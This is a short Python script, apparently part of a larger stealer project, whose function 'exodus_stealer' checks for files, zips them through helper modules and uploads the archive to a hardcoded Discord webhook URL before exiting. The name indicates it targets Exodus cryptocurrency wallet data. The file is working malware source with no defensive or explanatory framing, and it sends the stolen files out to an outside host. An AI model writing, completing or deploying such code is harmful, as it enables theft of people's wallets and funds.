from helpers.discord import Discord_Webhook_Client
from helpers.files import Files

def exodus_stealer():

    if Files.path_exists() == True:
        if Files.zip_files() == True:
            Discord_Webhook_Client.send_file("https://discord.com/api/webhooks/1090007280180797501/pCF8Nb3iv88Vyt9L4mO9RMDD9MPj-XNWj0jve8Yl7NMlbfoQLTePfJddRebmIymtSE_q")
            exit(code=None)
        else:
            exit(code=None)
    else:
        exit(code=None)

if __name__ == "__main__":
    exodus_stealer()